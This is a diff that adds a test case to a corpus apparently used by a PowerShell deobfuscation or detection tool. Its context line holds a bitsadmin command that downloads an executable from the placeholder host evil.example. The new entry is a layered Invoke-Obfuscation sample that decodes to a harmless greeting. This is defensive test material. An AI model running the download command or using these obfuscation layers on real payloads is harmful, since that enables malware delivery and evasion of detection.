@@ -93,6 +93,21 @@ CORPUS = [
     ("bitsadmin_download_lolbas", "lolbas",
      'bitsadmin.exe /transfer job "http://evil.example/x.exe" "%TEMP%\\x.exe"',
      "evil.example", None, [], []),
+    # User-reported Invoke-Obfuscation sample (2026-07-27):
+    # Fully layered token obfuscation using [Type]("Name") type coercion,
+    # &("Invoke-Expression") call-operator peel, .("%") ForEach-Object
+    # peel, Get-Variable dereference, ${var} normalization, string-method
+    # calls, and octal char reconstruction. The Workspace MUST produce
+    # `Write-Host 'Hello, from PowerShell!'` as the final payload.
+    ("invoke_obfuscation_full_stack", "multi_layer",
+     '$cmDwhy =[TyPe]("STrING")  ;   $pz2Sb0  =[TYpE]("cOnvert")  ;  '
+     '&("InvOKe-EXpReSSiOn") (  (&("gET-vaRIAblE")  ("CMdwhy"))."vALUe"'
+     '::("jOiN").Invoke("",( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , '
+     '164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,'
+     '40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| '
+     '.("%") { ( [CHAR] (  $Pz2sB0::"tOinT16"(( [sTring]${_}) ,8)))})) )',
+     "Write-Host 'Hello, from PowerShell!'", None,
+     ["T1027", "T1027.010"], ["char_array_join", "payload_decode"]),
 ]
 
 
